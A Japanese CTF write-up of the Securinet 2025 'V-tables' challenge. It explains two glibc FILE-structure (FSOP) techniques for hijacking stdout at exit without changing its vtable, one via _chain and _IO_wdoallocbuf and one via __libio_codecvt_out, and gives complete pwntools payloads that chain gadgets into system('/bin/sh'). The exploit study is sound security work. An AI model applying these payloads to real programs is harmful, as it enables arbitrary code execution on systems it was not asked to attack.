---
layout: page
title: "Securinet2025 V-tables"
date: 2025-10-07 00:00:00 -0000
---

libcリークをもらったあと、stdoutのFILE構造体をvtable以外書き換えてexitという問題です。

vtableを変えずに行けるんか、と新規性っぽさに驚いていたところ、chainでずらして重ねればよいという発想に至らず。なんならchainを使わずvtableを変えずでも行けるということも発覚したので、これはちゃんと書いておこうと思いました。

スクリプトは[こちら](https://github.com/jt00000/ctf.writeup/tree/master/securinet2025/vtable)

# chainを変える方法

今回の問題は、入力以降の表示がないので、stdout単体が呼ばれることはなく、mainから戻ったあとでexitを経由して`_IO_flush_all`が呼ばれます。

`_IO_flush_all` は `for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp->_chain)` という確認の仕方をするので、chainでつながっている限りどこまでも探してくれます。

今回はヒープに書くことができないので、もとのstdoutからアドレスを少し低位側にずらして、vtableを与えてあげれば良いです。

`_IO_cleanup` --> `_IO_flush_all` --> `_IO_new_file_overflow`のところでずれたvtableは代わりに`_IO_wfile_overflow`を呼び、`_IO_wdoallocbuf` から制御可能なポインタ`_wide_data`の中の関数ポインタにアクセスします。

```
Dump of assembler code for function _IO_wdoallocbuf:
   0x000073dc5c45d510 <+0>:     mov    rax,QWORD PTR [rdi+0xa0] // fp->_wide_data
   0x000073dc5c45d517 <+7>:     cmp    QWORD PTR [rax+0x30],0x0
   0x000073dc5c45d51c <+12>:    je     0x73dc5c45d520 <_IO_wdoallocbuf+16>
   0x000073dc5c45d51e <+14>:    ret
   0x000073dc5c45d51f <+15>:    nop
   0x000073dc5c45d520 <+16>:    push   r12
   0x000073dc5c45d522 <+18>:    push   rbp
   0x000073dc5c45d523 <+19>:    push   rbx
   0x000073dc5c45d524 <+20>:    mov    rbx,rdi 
   0x000073dc5c45d527 <+23>:    test   BYTE PTR [rdi],0x2
   0x000073dc5c45d52a <+26>:    jne    0x73dc5c45d5a0 <_IO_wdoallocbuf+144>
   0x000073dc5c45d52c <+28>:    mov    rax,QWORD PTR [rax+0xe0] // <-- _wide_data->vtable
   0x000073dc5c45d533 <+35>:    call   QWORD PTR [rax+0x68] // <-- _wfile_doallocate
```

あとはここに入るようにいい感じに変数を調整すれば良いです。上手く関数ポインタまで行ったあとは、今回はraxが使いにくかったので、COP２つで調整しました。

```python
stdout = leak
stdout_lock = base + 0x1e97b0
binsh = base + 0x1a7ea4
system = base + 0x53110
gadget1 = base + 0x0014b210#: mov rax, [rbx+0x20]; mov rdi, rbp; call qword ptr [rax+0x20];
gadget2 = base + 0x0009afe7#: mov rdi, [rax+8]; call qword ptr [rax];
fake_vtable = base+ 0x1e61d0 - 8

fsop = b''
fsop += flat(0x1111, 2)             # 0x00: _flags, _IO_read_ptr
fsop += flat(gadget1, stdout+0x70)  # 0x10: _IO_read_end, _IO_read_base
fsop += flat(0, 5)                  # 0x20: _IO_write_base, _IO_write_ptr
fsop += flat(7, 0x111111111111)     # 0x30: _IO_write_end, _IO_buf_base
fsop += flat(0x222222222222, 0x333333333333)  # 0x40: _IO_buf_end, _IO_save_base
fsop += flat(0x444444444444, 0x555555555555)    # 0x50: _IO_backup_base, _IO_save_end
fsop += flat(0x666666666666, 0x777777777777)    # 0x60: _makers, _chain
fsop += flat(stdout-8, system)      # 0x70: _fileno, _flags2, _old_offset
fsop += flat(binsh, stdout_lock)    # 0x80: _cur_column, _vtable_offset, _shortbuf, _lock
fsop += flat(stdout_lock, gadget2)  # 0x90: _offset, _codecvt
fsop += flat(stdout-0x28-0x20, 0)   # 0xa0: _wide_data, _freeres_list
fsop += flat(0x888888888888, 0x999999999999)    # 0xb0: _freeres_buf, ___pad5
fsop += flat(stdout, 0)             # 0xc0: _mode, _unused2
fsop += flat(0xaaaaaaaaaaaa, fake_vtable)       # 0xd0: _unused2, vtable
r.send(fsop[8:])
```

# stdoutのvtableをそのまま使う方法

`_IO_wdo_write` を使えば良いです。

以下は`_IO_cleanup`以降で`_IO_wdo_write`までの呼び出し順を示したものです。

`_IO_flush_all`と`_IO_unbuffer_all`からそれぞれ関数上は `_IO_wdo_write`につながっていますが、前者は引数の都合上実行されず、実際には後者一択になっています。

```
_IO_cleanup: https://elixir.bootlin.com/glibc/glibc-2.41.9000/source/libio/genops.c#L873
  _IO_flush_all: https://elixir.bootlin.com/glibc/glibc-2.41.9000/source/libio/genops.c#L711
    _IO_new_file_overflow: https://elixir.bootlin.com/glibc/glibc-2.41.9000/source/libio/fileops.c#L732
      _IO_do_flush: https://elixir.bootlin.com/glibc/glibc-2.41.9000/source/libio/libioP.h#L562
        X _IO_wdo_write: https://elixir.bootlin.com/glibc/glibc-2.41.9000/source/libio/wfileops.c#L38

  _IO_unbuffer_all: https://elixir.bootlin.com/glibc/glibc-2.41.9000/source/libio/genops.c#L797
    _IO_default_setbuf: https://elixir.bootlin.com/glibc/glibc-2.41.9000/source/libio/genops.c#L477
      _IO_new_file_sync: https://elixir.bootlin.com/glibc/glibc-2.41.9000/source/libio/fileops.c#L793
        _IO_wdo_write: https://elixir.bootlin.com/glibc/glibc-2.41.9000/source/libio/wfileops.c#L38
          __libio_codecvt_out: https://elixir.bootlin.com/glibc/glibc-2.41.9000/source/libio/iofwide.c#L110
```

それぞれの関数での制約そのものは、あんまり書いてもおもしろくなさそうなので省略します。

当初この`__libio_codecvt_out`には到達できることを把握していたのですが、何を思ったかmangleされていると判断してしまい、だめじゃんと思って候補から外していました。

`gs`はグローバルの何かで特に触れるものではないんだなと決めつけて見ていましたが、よく見ると最初に引数ポインタから抜いてきてるんですね。かなり迂闊でした。

```c
__libio_codecvt_out (struct _IO_codecvt *codecvt, __mbstate_t *statep,
             const wchar_t *from_start, const wchar_t *from_end,
             const wchar_t **from_stop, char *to_start, char *to_end,
             char **to_stop)
{
  enum __codecvt_result result;

  struct __gconv_step *gs = codecvt->__cd_out.step;
  int status;
  size_t dummy;
  const unsigned char *from_start_copy = (unsigned char *) from_start;

  codecvt->__cd_out.step_data.__outbuf = (unsigned char *) to_start;
  codecvt->__cd_out.step_data.__outbufend = (unsigned char *) to_end;
  codecvt->__cd_out.step_data.__statep = statep;

  __gconv_fct fct = gs->__fct;
  if (gs->__shlib_handle != NULL)
    PTR_DEMANGLE (fct);

  status = DL_CALL_FCT (fct,
            (gs, &codecvt->__cd_out.step_data, &from_start_copy,
             (const unsigned char *) from_end, NULL,
             &dummy, 0, 0));
```

mangleがフラグによって有無が変わるというパターンもみたことがなかったので、良い機会になりました。

```python
stdout = leak
stdout_lock = base + 0x1e97b0
binsh = base + 0x1a7ea4
dosystem = base + 0x52c92
gadget = base + 0x00091755#: mov rdi, [rbx+8]; call qword ptr [rbx];

fsop = b''
fsop += flat(0x00, 2)              # 0x00: _flags, _IO_read_ptr
fsop += flat(3, 4)              # 0x10: _IO_read_end, _IO_read_base
fsop += flat(1, 2)              # 0x20: _IO_write_base, _IO_write_ptr
fsop += flat(1, dosystem)              # 0x30: _IO_write_end, _IO_buf_base
fsop += flat(binsh, 0)             # 0x40: _IO_buf_end, _IO_save_base
fsop += flat(0x111111111111, 0x222222222222)            # 0x50: _IO_backup_base, _IO_save_end
fsop += flat(0x333333333333, 0)            # 0x60: _makers, _chain
fsop += flat(stdout+0x58, 0x444444444444)  # 0x70: _fileno, _flags2, _old_offset
fsop += flat(gadget, stdout_lock) # 0x80: _cur_column, _vtable_offset, _shortbuf, _lock
fsop += flat(0x555555555555, stdout+0x70-0x38)            # 0x90: _offset, _codecvt
fsop += flat(stdout+0x10, 0)            # 0xa0: _wide_data, _freeres_list
fsop += flat(stdout+0xb8, 0x666666666666)            # 0xb0: _freeres_buf, ___pad5
fsop += p32(0x1)+p32(0)+p64(0x777777777777)  # 0xc0: _mode, _unused2
fsop += flat(0x888888888888, 0)            # 0xd0: _unused2, vtable

r.send(fsop[:0xd8])
```

